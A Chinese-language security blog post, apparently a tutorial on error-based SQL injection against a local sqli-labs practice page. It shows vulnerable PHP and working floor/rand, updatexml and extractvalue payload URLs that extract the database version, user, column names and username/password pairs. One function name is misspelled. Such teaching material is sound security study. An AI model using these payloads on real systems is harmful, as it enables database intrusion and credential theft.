---
layout: post
title: "1.2.2-SQL注入-SQL注入语法类型-报错注入"
date: 2018-06-16
category: web安全
tags: sql注入
---

## 报错注入

### 01 报错注入原理

构造payload让信息通过错误提示回显出来  
应用场景：  
查询不回显内容，会打印错误信息  
Update、insert等语句，会打印错误信息  

	if($row)
	{
		echo 'Your Login name:'.$row['username'];
	}
	else
	{
		print_r(mysql_error());
	}

### 02 报错注入方法

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/01.png)
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/02.png)
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/03.png)

	select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2));

	http://127.0.0.1:90/Less-1/?id=1' and (select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2)))--+

	http://127.0.0.1:90/Less-1/?id=1' and (select count(*) from information_schema.tables group by concat((select user()),0x7e,floor(rand(0)*2)))--+

	http://127.0.0.1:90/Less-1/?id=1' and (select count(*) from information_schema.tables group by concat((select database() limit 0,1),0x7e,floor(rand(0)*2)))--+ // 表名

	http://127.0.0.1:90/Less-1/?id=1' and (select count(*) from information_schema.tables group by concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 3,1),0x7e,floor(rand(0)*2)))--+ // 列名

	http://127.0.0.1:90/Less-1/?id=1' and (select count(*) from information_schema.tables group by concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 3,1),0x7e,floor(rand(0)*2)))--+ // 列名

	http://127.0.0.1:90/Less-1/?id=1' and (select count(*) from information_schema.tables group by concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x7e,floor(rand(0)*2)))--+ // 数据

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/04.png)
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/05.png)

	// 特殊符号导致方法报错，报错可以输出错误信息
	select ectractvalue(1,concat(0x7e,(select user()),0x7e));
	select updatexml(1,concat(0x7e,(select user()),0x7e),1);  

	报错注入只有32位长 用 substr截取字符串substr('ab',1,2) // 从第一位截取两个
	http://127.0.0.1:90/Less-1/?id=1' and updatexml(1,concat(0x7e,(select substr(concat(password),1,2) from users limit 0,1),0x7e),1) --+








